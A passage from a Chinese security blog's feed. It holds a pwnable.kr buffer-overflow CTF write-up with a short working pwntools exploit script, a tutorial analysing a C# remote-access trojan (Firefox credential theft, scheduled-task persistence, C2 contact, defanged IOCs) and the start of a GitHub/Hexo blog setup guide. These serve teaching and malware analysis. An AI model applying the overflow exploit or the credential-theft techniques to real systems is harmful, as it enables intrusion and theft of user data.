<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function func:</span><br><span class="line">&#x3D;&gt; 0x080491f6 &lt;+0&gt;:    endbr32</span><br><span class="line">   0x080491fa &lt;+4&gt;:    push   ebp</span><br><span class="line">   0x080491fb &lt;+5&gt;:    mov    ebp,esp</span><br><span class="line">   0x080491fd &lt;+7&gt;:    push   ebx</span><br><span class="line">   0x080491fe &lt;+8&gt;:    sub    esp,0x24</span><br><span class="line">   0x08049201 &lt;+11&gt;:    call   0x8049130 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x08049206 &lt;+16&gt;:    add    ebx,0x2dfa</span><br><span class="line">   0x0804920c &lt;+22&gt;:    sub    esp,0xc</span><br><span class="line">   0x0804920f &lt;+25&gt;:    lea    eax,[ebx-0x1ff8]</span><br><span class="line">   0x08049215 &lt;+31&gt;:    push   eax</span><br><span class="line">   0x08049216 &lt;+32&gt;:    call   0x8049090 &lt;printf@plt&gt;</span><br><span class="line">   0x0804921b &lt;+37&gt;:    add    esp,0x10</span><br><span class="line">   0x0804921e &lt;+40&gt;:    sub    esp,0xc</span><br><span class="line">   0x08049221 &lt;+43&gt;:    lea    eax,[ebp-0x28]</span><br><span class="line">   0x08049224 &lt;+46&gt;:    push   eax</span><br><span class="line">   0x08049225 &lt;+47&gt;:    call   0x80490a0 &lt;gets@plt&gt;</span><br><span class="line">   0x0804922a &lt;+52&gt;:    add    esp,0x10</span><br><span class="line">   0x0804922d &lt;+55&gt;:    cmp    DWORD PTR [ebp+0x8],0xcafebabe</span><br><span class="line">   0x08049234 &lt;+62&gt;:    jne    0x804924a &lt;func+84&gt;</span><br><span class="line">   0x08049236 &lt;+64&gt;:    sub    esp,0xc</span><br><span class="line">   0x08049239 &lt;+67&gt;:    lea    eax,[ebx-0x1fe9]</span><br><span class="line">   0x0804923f &lt;+73&gt;:    push   eax</span><br><span class="line">   0x08049240 &lt;+74&gt;:    call   0x80490c0 &lt;system@plt&gt;</span><br><span class="line">   0x08049245 &lt;+79&gt;:    add    esp,0x10</span><br><span class="line">   0x08049248 &lt;+82&gt;:    jmp    0x804925c &lt;func+102&gt;</span><br><span class="line">   0x0804924a &lt;+84&gt;:    sub    esp,0xc</span><br><span class="line">   0x0804924d &lt;+87&gt;:    lea    eax,[ebx-0x1fe1]</span><br><span class="line">   0x08049253 &lt;+93&gt;:    push   eax</span><br><span class="line">   0x08049254 &lt;+94&gt;:    call   0x80490b0 &lt;puts@plt&gt;</span><br><span class="line">   0x08049259 &lt;+99&gt;:    add    esp,0x10</span><br><span class="line">   0x0804925c &lt;+102&gt;:    nop</span><br><span class="line">   0x0804925d &lt;+103&gt;:    mov    ebx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x08049260 &lt;+106&gt;:    leave</span><br><span class="line">   0x08049261 &lt;+107&gt;:    ret  </span><br><span class="line">End of assembler dump.</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>​    可以看出来，要覆盖的key在ebp+0x8处，gets获取的字符串存储位置从ebp-0x28处开始，也就是偏移为0x30</p>
<p>​    也可以通过对gets前下断，c运行到断点处，n继续运行键入AAAA作为标记然后查看内存来算出偏移。</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn20210730104415.png"></p>
<p><strong>使用pwntool进行远程漏洞利用</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    c = remote(<span class="string">&quot;pwnable.kr&quot;</span>,<span class="number">9000</span>)</span><br><span class="line">    c.sendline(<span class="built_in">bytes</span>(<span class="string">&quot;A&quot;</span>,<span class="string">&#x27;latin-1&#x27;</span>)*<span class="number">0x30</span>+p32(<span class="number">0xcafebabe</span>))</span><br><span class="line">    c.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux - pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>如何分析各种类型的恶意样本之--C#恶意样本分析技巧</title>
    <url>/2021/01/01/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901/</url>
    <content><![CDATA[<p>​    日常样本分析中，我们会遇到各式各样的语言所编写的恶意样本。除了最基础的C/C++之外，使用C#、python、VBScript、Office宏、PowerShell来构造恶意代码也较为常见。</p>
<p>​    为了让新入门者对各种类型样本的代码结构和分析流程都进行一次了解，我构思了如下系列文章《如何分析各种类型的恶意样本》来进行讲解，希望可以帮到大家。</p>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><ul>
<li>C#是<a href="https://baike.baidu.com/item/%E5%BE%AE%E8%BD%AF%E5%85%AC%E5%8F%B8/732128">微软公司</a>发布的一种由C和C++衍生出来的面向对象的编程语言、运行于<a href="https://baike.baidu.com/item/.NET%20Framework">.NET Framework</a>和.NET Core(完全开源，跨平台)之上的高级程序设计语言。由于其相较于C/C++更为易于开发且同样强大，近年来越来越多的APT组织以及一些RAT工具都将C#做为主编程语言进行恶意样本的Downloader或者恶意样本本身来开发。</li>
<li>.NET/C#的反编译工具常见的有：.Net Reflector、ILSpy/dnSpy、JetBrains dotPeek、GrayWolf等。我常用的是ILSpy/dnSpy这两个工具，尤其dnSpy所具有的动态调试功能是分析样本的利器。</li>
<li>另外.Net/C#相关的逆向分析工具还有很多，比如解混淆的de4Dot，这些工具在吾爱的工具包中都已经集成了，需要可以去吾爱进行下载并使用。</li>
</ul>
<p>这里我将对一个典型的适合新手进行分析的C#远控样本进行分析，来对一些基础的C#分析技术点进行说明。</p>
<ul>
<li>样本信息如下：</li>
</ul>
<table>
<thead>
<tr>
<th align="center">描述</th>
<th align="center">信息</th>
</tr>
</thead>
<tbody><tr>
<td align="center">MD5</td>
<td align="center">BFA95399E5F9413A0EC9289FAA1DC801</td>
</tr>
</tbody></table>
<ul>
<li>拿到样本后通过Exeinfo查看，样本是一个.net程序，使用dnspy进行分析</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/image-20200513183039006.png"></p>
<ul>
<li>样本执行流程大致如下：</li>
</ul>
<img src="https://cdn.jsdelivr.net/gh/hskull00/Images/博客相关/image-20200515184314506.png" style="zoom:80%;" />

<h1 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h1><h2 id="样本自身功能分析"><a href="#样本自身功能分析" class="headerlink" title="样本自身功能分析"></a>样本自身功能分析</h2><ul>
<li>将样本拖入DnSpy开始进行分析（Dnspy运行需要.Net Framework环境的支持，不能运行请下载并安装后再运行Dnspy），拖入后会显示下图所示一些信息包括文件名以及版本等静态信息。另外要注意的是exe文件拖入Dnspy后在侧边栏中名称为黄色，而dll文件拖入后在侧边栏中名称为白色。</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90120210101214706.png"></p>
<p>之后右键Go To Entry Point即可跳转到main函数，一般来说程序具有窗口(无论隐藏与否)时，main函数都是用来调用Application.Run()进行窗口的启动(学过SDK/MFS的同学应该不陌生，这就相当于启动了窗口的消息循环)：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90120210101215321.png"></p>
<p>一般来说，恶意操作都会在隐藏窗口类中进行，我们只需向下寻找即可。向下分析后果然找到了内嵌ShellCode代码：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200514101237484.png"></p>
<p>这里提一句，在Dnspy中也可以进行交叉引用的分析，只要选中函数名或变量名，然后右键Analyze即可打开对应窗口进行查看，很方便：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90120210101220353.png"></p>
<ul>
<li>上述的shellcode在样本中是加密存储的，样本执行时会对其进行两次解密，这里就要用到Dnspy动态调试的功能来对解密后的shellcode进行dump，点击上方的start，默认以C#代码进行调试(另外还有IL和VB两种查看方式)，Dnspy调试快捷键和VS相同(F9、F10、F11)，我们在调试时，会自动显示出Locals窗口，里面对当前所在命令空间的变量进行实时显示。Dnspy中所有能显示的窗口都在Debug选项下。</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20210101221551373.png"></p>
<p>运行到解密完成后，观察 rawAssembly的值：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90120210101222121.png"></p>
<p>将其中数据拿出后，发现解密后的shellcode为一个PE格式的恶意代码：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/image-20200514100156590.png"></p>
<p>通过Locals中右键rawAssenbly进行save操作，将shellcdoe保存到本地，留待稍后分析。</p>
<ul>
<li>这里解密后的操作时利用C#反射的技术进行shellcode调用，可以判断dump到的shellcode为一个dll，接口为dll的Main函数，传入参数如下所示，同样通过调试运行观察内存得到：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200514101412539.png"></p>
<h2 id="dump到的dll分析"><a href="#dump到的dll分析" class="headerlink" title="dump到的dll分析"></a>dump到的dll分析</h2><ul>
<li>查看dump到的恶意shellcode，确实是个dll文件，Dnspy分析其名称为CoreFunctions.dll(重要)，信息如下所示：</li>
</ul>
<table>
<thead>
<tr>
<th align="center">描述</th>
<th align="center">信息</th>
</tr>
</thead>
<tbody><tr>
<td align="center">MD5</td>
<td align="center">501FEB03129FF392F6FFB5AEEC900356</td>
</tr>
<tr>
<td align="center">名称</td>
<td align="center">CoreFunctions.dll</td>
</tr>
</tbody></table>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200514160735637.png"></p>
<ul>
<li>对于C#dll的分析，首先我们可以考虑自己写一个Loader然后将Loader.exe和dll一起拖入dnspy，然后进行dll调试。</li>
</ul>
<p>我用到了VS进行Loader的编写，这里有个要注意点是，在using dll时，用到的dll名称要和将dll拖入dnspy中反编译出的命名空间名称一致即为CoreFunctions，代码的编写很简单，只要将对应的Main函数调用并传入上述抓取到的参数即可：</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">CoreFunctions.Class1.Main(<span class="string">&quot;02bc3.resources&quot;</span>, <span class="string">&quot;5de4f.png&quot;</span>, <span class="string">&quot;JV6tiESFB&quot;</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>切记：建议向我这样加上一个窗口和调用按钮，防止在编译exe时不小心加载了恶意dll。当然也可以不加，不过就需要时刻注意自己生成exe的方式为右键重新生成而不是直接Release。</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90120210101225528.png"></p>
<ul>
<li>另外分享一个快速调试方式，经过前辈们分析底层函数发现一个关键函数：InvokeMethodFast()，此函数在运行dll之后会被调用，步入断点所在的代码，就可以直接进入dll进行调试。ps:这个方法可以一直运行下去，省了dump的麻烦，可谓非常厉害了</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200514174945600.png"></p>
<ul>
<li>此dll执行的操作流程大致如下，详细分析不在赘述：</li>
</ul>
<p><strong>获取样本完整路径-&gt;加载样本的资源(“02bc3.resources”)-&gt;遍历资源找到”5de4f.png”的数据-&gt;对数据进行处理并以”JV6tiESFB”作为Key来解密数据-&gt;得到新的恶意代码并执行</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200514163656864.png"></p>
<p>资源如图所示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200514165728086.png"></p>
<h2 id="新恶意代码分析"><a href="#新恶意代码分析" class="headerlink" title="新恶意代码分析"></a>新恶意代码分析</h2><ul>
<li>依旧将新的恶意代码dump然后分析，命名为ReZer0V2.exe信息如下：</li>
</ul>
<table>
<thead>
<tr>
<th align="center">描述</th>
<th align="center">信息</th>
</tr>
</thead>
<tbody><tr>
<td align="center">MD5</td>
<td align="center">B9C0837EED92228BFD8C55E2D40630D6</td>
</tr>
<tr>
<td align="center">名称</td>
<td align="center">ReZer0V2.exe</td>
</tr>
</tbody></table>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200514165433142.png"></p>
<p>分析调用后会发现，其会从EntryPonit入口点开始运行代码，样本是一个C#的exe，可以直接进行调试分析，调试方法和最初样本一样。</p>
<p>这份恶意代码又加入了新的东西，那就是C#程序防止反编译常用到的混淆操作。由于有混淆不能正常调试，所以调试之前先使用de4dot进行解混淆操作(大部分情况下不能解出正确的函数名，只是使得代码更加易读一点)。de4dot用法是将C#程序拖到de4dot.exe上执行即可(版本选择正确)，也可以cmd命令行执行，看你个人选择。</p>
<ul>
<li>此恶意程序完成了如下的操作:</li>
</ul>
<p>创建互斥体”FWYvRWJ”防多开、睡眠主线程</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200514181658845.png"></p>
<p>查询指定文件：<code>&quot;C:\Users\Administrator\AppData\Roaming\wpohqL.exe&quot;</code>是否存在，不存在生成，完成对最开始样本的复制存储</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200514182340233.png"></p>
<p>之后调用函数smethod_6进行操作：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200514182428739.png"></p>
<p>主要完成了如下操作：</p>
<p>向路径”C:\Users\Administrator\AppData\Local\Temp&quot;下生成了一个临时命名的临时文件，将资源中的XML数据进行替换之后填充临时文件，如图所示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200514213020087.png"></p>
<p>之后构造一个进程启动信息，然后启动进程 schtasks.exe，输入命令为：/Create  /TN ”Updates\ wpohqL”  /XML  “C:\Users\Administrator\AppData\Local\Temp%.tmp”，创建一个计划任务，任务目的是在用户登录时启动程序：C:\Users\Administrator\AppData\Roaming\wpohqL.exe，完成对样本副本的持久化</p>
<p>最后程序流程执行到运行一个新的恶意程序</p>
<h2 id="熟悉的C-程序分析"><a href="#熟悉的C-程序分析" class="headerlink" title="熟悉的C++程序分析"></a>熟悉的C++程序分析</h2><ul>
<li>这次dump到的恶意程序，是一个熟悉的C++程序，信息如下：</li>
</ul>
<table>
<thead>
<tr>
<th align="center">描述</th>
<th align="center">信息</th>
</tr>
</thead>
<tbody><tr>
<td align="center">MD5</td>
<td align="center">eb5e1c063fab1a1a0f93ab615b72b461</td>
</tr>
</tbody></table>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515132504545.png"></p>
<p>这个恶意程序就是做恶意操作的主要程序，有以下恶意行为：</p>
<p>通过动态获取API地址来进行功能的实现，程序内置hash后的API名称字符串，通过函数sub.004031E5获取</p>
<p>利用SetErrorMode()来进行反沙箱操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515144232160.png"></p>
<p>调用advapi32.dll中的函数来计算出一个唯一hash，用于创建互斥体，图中一个为计算之前的，圈出来为计算之后的互斥体名称，检测多开</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515150755098.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515143401005.png"></p>
<ul>
<li>程序有几个关键的call，分别用于完成不同的功能：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90120210101233458.png"></p>
<p><strong>第一个call：</strong></p>
<p>获取注册表信息，修改FirFox配置进行流量劫持：</p>
<p>“SOFTWARE\Mozilla\Mozilla Firefox”拼接为完整信息“SOFTWARE\Mozilla\Mozilla Firefox\53.0 (x 86 zh-C)\Main”，并向path环境变量中添加新的路径：”C:\Program Files\Mozilla Firefox”</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515174646957.png"></p>
<p>检测nss3.dll是否存在，存在加载dll，动态获取API</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515174915441.png"></p>
<p>获取的API有：</p>
<p>NSS_Init、NSS_Shutdown、PK11_GetInternalKeySlot、PK11_FreeSlot、PK11_Authenticate、PK11SDR_Decrypt、PK11_CheckUserPassword、SECITEM_FreeItem</p>
<p>之后大范围去将“\AppData\Roaming\Mozilla\Firefox”+下图所示的路径拼接：(图示为一部分)</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515180302171.png"></p>
<p>然后利用nss.dll对Firefox配置进行一些列操作</p>
<p><strong>第二个call：</strong></p>
<p>释放隐藏的副本文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515154911880.png"></p>
<p>用于在本地”\ AppData\ Roaming\ “创建一个新目录，并向其中存放样本副本，同时为目录和副本都设置隐藏属性，路径如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515152420753.png"></p>
<p><strong>第三个call：</strong></p>
<p>构造Socket套接字，建立TCP远程通信，上传获取到的所有本机信息，等待后续远控</p>
<p>获取信息：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515172032119.png"></p>
<p>建立连接：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515172130345.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515170114379.png"></p>
<p>C2信息如下：</p>
<p>URL：hxxp://broken6[.]cf/L8/fre.pnp</p>
<p>IP：104.27.145.219:80</p>
<h1 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs"></a>IOCs</h1><p><strong>Md5：</strong></p>
<p>BFA95399E5F9413A0EC9289FAA1DC801</p>
<p>501FEB03129FF392F6FFB5AEEC900356</p>
<p>B9C0837EED92228BFD8C55E2D40630D6</p>
<p>eb5e1c063fab1a1a0f93ab615b72b461</p>
<p><strong>URL：</strong></p>
<p>hxxp://broken6[.]cf/L8/fre.pnp</p>
<p><strong>Domain:</strong></p>
<p>broken6[.]cf</p>
<p><strong>IP:</strong></p>
<p>104.27.145.219:80</p>
]]></content>
      <categories>
        <category>教程</category>
        <category>样本分析</category>
      </categories>
      <tags>
        <tag>C#</tag>
        <tag>.NET</tag>
        <tag>样本分析</tag>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title>一篇文章教会你搭建自己的博客</title>
    <url>/2020/12/01/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<p>​    想搭建一个博客很久了，但最近才着手做了这个事。使用博客记录一下平时自己的学习内容，同时也逼迫自己坚持学习。</p>
<p>​    这里采用GitHub+Hexo搭建博客，可以选择买一个.com域名(啥域名都被注册了。。退而求其次整个cn吧，还便宜)，这样输入URL比较有逼格。记得提前买域名，因为要实名认证审核。</p>
<h1 id="Git下载"><a href="#Git下载" class="headerlink" title="Git下载"></a>Git下载</h1><p>​    首先需要去注册一个GitHub账号，这步省略不说。之后，需要在本地下载一个GitGub客户端，可以去<a href="https://git-scm.com/">Git官网</a>进行下载，这里最新版本是2.29.2。</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201116092100527.png" alt="image-20201116092100527"></p>
<p>​    安装过程可以配置一些参数，参考链接<a href="https://zhuanlan.zhihu.com/p/103325381">参数配置</a>，安装完成后，在空白处点击鼠标右键，会出现如下图标：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201116203201882.png" alt="image-20201116203201882"></p>
<p>​    之后打开Git控制台，输入git即可显示安装后的git信息：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201116203356662.png" alt="image-20201116203356662"></p>
<h1 id="绑定GitHub及文件管理"><a href="#绑定GitHub及文件管理" class="headerlink" title="绑定GitHub及文件管理"></a>绑定GitHub及文件管理</h1><h2 id="绑定"><a href="#绑定" class="headerlink" title="绑定"></a>绑定</h2><p>​    虽然可以直接使用GitHub进行文件的上传，但是并不是很好用，所以这里还是选择将git与我们的GitGub账号绑定，利用SSH进行文件的传输。</p>
<p>   Windows下Git的用法 和用Liunx下进行GitGub管理类似，首先得生成SSH公钥。利用公钥的好处在于不用每次都进行用户的登陆，使用便捷。使用Windows下的git生成SSH公钥、私钥和将其添加到GitGub的步骤如下：</p>
<ol>
<li>一般来说安装选了Git Bash的话，会默认安装SSH。可以打开终端输入ssh命令来查看本机是否装了SSH，如下可以看出已经装了ssh。</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201116215113286.png" alt="image-20201116215113286"></p>
<p>​    未安装可以用命令apt-get ssh安装</p>
<ol start="2">
<li>接着就是对密钥的生成，首先输入ssh-keygen -t  rsa命令，表示我们指定RSA算法进行密钥的生成，然后回车后手动输入要保存key的目录和文件，这里不输入选择默认就好(想输入也行，都无所谓)。</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201116215903303.png" alt="image-20201116215903303"></p>
<p>​    这里说明一下在不同系统中，ssh目录的位置：</p>
<ul>
<li>Linux：~/.ssh</li>
<li>Mac：~/.ssh</li>
<li>Windows 10：C:/Users/username/.ssh</li>
</ul>
<ol start="3">
<li>然后就可以找到我们的公钥，存储在id_ras.pub中，将其内容复制然后添加到GitHub中即可，可以直接利用控制台进行cat进行查看：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201117212024815.png" alt="image-20201117212024815"></p>
<ol start="4">
<li>去GitHub添加，在Setting下的SSH Keys中，添加完成后如图：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201117212136519.png" alt="image-20201117212136519"></p>
<ol start="5">
<li>紧接着去验证是否成功，键入命令ssh -T <a href="mailto:&#103;&#105;&#116;&#64;&#103;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#x6f;&#x6d;">&#103;&#105;&#116;&#64;&#103;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#x6f;&#x6d;</a>进行链接，首次验证填yes就好：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201117212409292.png" alt="image-20201117212409292"></p>
<h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2><p>​    第一次进行Git仓库的管理，本地是没有git仓库的，这时需要经历如下的步骤，然后使得可以操控远程仓库进行文件管理：</p>
<ul>
<li>首先直接将远程仓库clone到本地</li>
<li>然后将文件添加并commit到本地仓库</li>
<li>最后将本地仓库的内容push到远程仓库</li>
</ul>
<p>实际操作如下：</p>
<ol>
<li>首先去打开自己的项目，然后查看项目地址，这里我用到了之前已经使用的仓库：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201117212908672.png" alt="image-20201117212908672"></p>
<ol start="2">
<li>接着利用git clone 命令将远程仓库clone到本地，用SSH链接和URL链接都行：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201128224437869.png" alt="image-20201128224437869"></p>
<ol start="3">
<li>clone成功后，找和到本地仓库路径，查看内容是否和远程仓库一致：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201128225757960.png" alt="image-20201128225757960"></p>
<ol start="4">
<li>在当前路径下进行的操作，并不能及时反映到本地仓库和远程仓库，还需要将其git add添加到缓冲区，然后git commit提交到本地仓库，最后再push到远程仓库才算完整步骤，具体操作如下：</li>
</ol>
<ul>
<li>这里新建一个test.txt的文件作为测试，利用vim编辑test.txt，并随意写入一段内容，然后利用git status命令查看仓库状态：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201128230537086.png" alt="image-20201128230537086"></p>
<p>上述可见，会提示刚刚创建的测试文件test.txt并没有被追踪，所以接下来还需要将文件添加到“临时缓冲区”，然后才能进行commit操作，第一次进行提交操作会提示输入用户名和密码，正常输入后即可完成提交，这里记得在commit时，用-m参数对于提交操作进行描述，方便后续进行日志查看：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201128231603100.png" alt="image-20201128231603100"></p>
<ul>
<li>想要查看提交状态，课可以使用命令git log进行提交日志的查看：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201128231714178.png" alt="image-20201128231714178"></p>
<ul>
